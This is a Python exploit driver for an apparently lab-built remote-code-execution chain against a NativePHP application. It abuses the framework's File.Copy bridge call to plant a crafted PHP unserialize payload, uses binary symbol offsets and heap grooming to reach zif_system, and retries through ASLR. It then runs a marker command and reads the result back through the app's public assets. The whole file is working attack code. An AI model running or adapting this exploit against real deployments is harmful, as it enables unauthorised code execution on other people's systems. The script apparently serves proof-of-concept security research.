#!/usr/bin/env python3
"""
shape9_attack.py — Mission 9 driver: full in-band zero4 RCE through the
NativePHP bridge delivery.

  1. shape9_elfsyms.py on the bundled (runner) binary -> OFF_EMPTY / OFF_ZIF
     (attacker-side knowledge of the shipped binary; no gdb, no /proc).
  2. Build the spool payload: outer a:1020 dup-key object NativeAsyncRce
     carrying the dance payload (dp), FIRE payload (fp), elfsyms offsets
     (oe/oz) and the marker command (ecmd) as object properties — the
     attacker controls ONLY spool bytes.
  3. Per attempt (fresh runner process = fresh ASLR roll, same as a device):
       POST /upload                      (app file-save feature)
       POST /_native/api/call File.Copy  (raw-path copy, framework hole)
       POST /_native/api/call AsyncTask.Dispatch  (runner unserialize)
  4. Receipt read-back THROUGH THE BRIDGE: File.Copy the uid marker into
     public/ and GET /_assets/... — the framework exfiltrates its own pwning.

usage: shape9_attack.py [base_url] [lab_dir] [runner_binary] [max_attempts]
"""
import json
import os
import subprocess
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8811"
LAB = sys.argv[2] if len(sys.argv) > 2 else os.path.dirname(os.path.abspath(__file__))
RUNNER_BIN = sys.argv[3] if len(sys.argv) > 3 else "/tmp/php8512_build/plain2/sapi/cli/php"
MAX = int(sys.argv[4]) if len(sys.argv) > 4 else 30
MARKER = "/tmp/pwned_nativephp_rce"
MARKER_ASSET = "shape9_rce_receipt.txt"


def post(path, data=None, headers=None, raw=False):
    body = data if raw else urllib.parse.urlencode(data, doseq=True).encode()
    req = urllib.request.Request(BASE + path, data=body, headers=headers or {})
    with urllib.request.urlopen(req, timeout=120) as r:
        return r.status, r.read().decode("utf-8", "replace")


def get(path):
    with urllib.request.urlopen(BASE + path, timeout=30) as r:
        return r.status, r.read().decode("utf-8", "replace")


def bridge(method, params):
    data = {"method": method}
    for k, v in params.items():
        data[f"params[{k}]"] = v
    return post("/_native/api/call", data)


def elfsyms(binary):
    """RELA-scan the bundled binary for the two chain offsets."""
    here = os.path.dirname(os.path.abspath(__file__))
    out = subprocess.run(
        [sys.executable, os.path.join(here, "shape9_elfsyms.py"), binary],
        capture_output=True, text=True)
    line = out.stdout.strip()
    print(f"[elfsyms] {line}")
    oe = oz = None
    for tok in line.split():
        if tok.startswith("zif_system=0x"):
            oz = tok.split("=")[1]
        if tok.startswith("zend_empty_array=0x"):
            oe = tok.split("=")[1]
    if not oe or not oz:
        raise SystemExit(f"[FAIL] elfsyms could not recover offsets from {binary}")
    return oe, oz


def build_dance():
    """dp — verbatim the poc_matrix/pwn_zero4_live.php dance payload."""
    d = 'i:129;i:5;'                    # elem0: LONG victim, key 129 (clean slot)
    d += 'i:1028;i:1;'                  # elem1: LONG victim (u5 @data[130])
    d += 'i:8;s:8:"AAAAAAAA";'          # elem2: STRING victim (u9 @data[134])
    d += 'i:10;i:1;'                    # elem3: LONG victim (u13 @data[138])
    d += 'i:12;s:8:"BBBBBBBB";'         # elem4: STRING victim (u17 @data[142])
    for m in range(5, 62):
        d += 'i:%d;i:1;' % (2 * m + 4)
    for j in range(2, 66):
        d += 'i:%d;R:1;' % (256 * j)    # slot-0 chains
    d += 'i:16896;i:1;'                 # elem126: leak push @data[126]
    return 'a:127:{' + d + '}'


def build_payload(oe, oz, ecmd):
    dp = build_dance()
    fp = 'O:15:"NativeAsyncFire":0:{}'
    props = [
        ("dp", dp),
        ("fp", fp),
        ("oe", oe),
        ("oz", oz),
        ("ecmd", ecmd),
    ]
    body = "".join(f's:{len(k)}:"{k}";s:{len(v)}:"{v}";' for k, v in props)
    obj = f'i:9998;O:14:"NativeAsyncRce":{len(props)}:{{{body}}}'
    els = [f"i:{k};i:1;" for k in range(1018)]
    els.append(obj)
    els.append("i:9998;i:5;")
    return "a:1020:{" + "".join(els) + "}"


def main():
    oe, oz = elfsyms(RUNNER_BIN)
    ecmd = f"id > {MARKER}"
    payload = build_payload(oe, oz, ecmd)
    print(f"[payload] {len(payload)} bytes (oe={oe} oz={oz})")

    # stage 1: persist attacker bytes (any app file-save feature)
    st, body = post("/upload", payload.encode(), {"X-Filename": "user-content.bin"}, raw=True)
    up = json.loads(body)["path"]
    print(f"[upload] {st} {up} ({len(payload)} bytes)")

    for attempt in range(1, MAX + 1):
        task = f"shape9-rce-{attempt:08d}"
        spool = f"{LAB}/storage/framework/async/payload/{task}.task"
        st, body = bridge("File.Copy", {"from": up, "to": spool})
        assert json.loads(body)["data"]["success"] is True, "File.Copy failed"
        st, body = bridge("AsyncTask.Dispatch", {"id": task})
        out = json.loads(body)["data"]
        print(f"--- attempt {attempt}: exit={out['runner_exit']} ---")
        print(out["runner_out"][:2500])

        if "TRIGGER var_dump" in out["runner_out"]:
            print(f"[+] CALL stage reached on attempt {attempt}")
            break
        if any(s in out["runner_out"] for s in ("M2-DONE", "M1 block2")):
            print(f"[*] dance reached, reclaim missed — retrying (layout lottery)")
    else:
        print(f"[FAIL] no TRIGGER in {MAX} attempts")
        return 1

    # receipt read-back through the bridge itself (File.Copy -> /_assets)
    st, body = bridge("File.Copy", {"from": MARKER, "to": f"{LAB}/public/{MARKER_ASSET}"})
    print(f"[exfil File.Copy] {st} {body}")
    try:
        st, content = get(f"/_assets/{MARKER_ASSET}")
        print(f"[RECEIPT via /_assets/{MARKER_ASSET}] {st}")
        print(content.strip())
        if "uid=" in content:
            print("[PASS] FULL zero4 chain through the NativePHP bridge: "
                  "upload -> File.Copy -> AsyncTask.Dispatch -> in-band leak "
                  "-> forged zend_object -> zif_system -> uid marker -> "
                  "bridge exfil read-back")
            return 0
    except Exception as e:
        print(f"[FAIL] marker not exfiltrated: {e}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
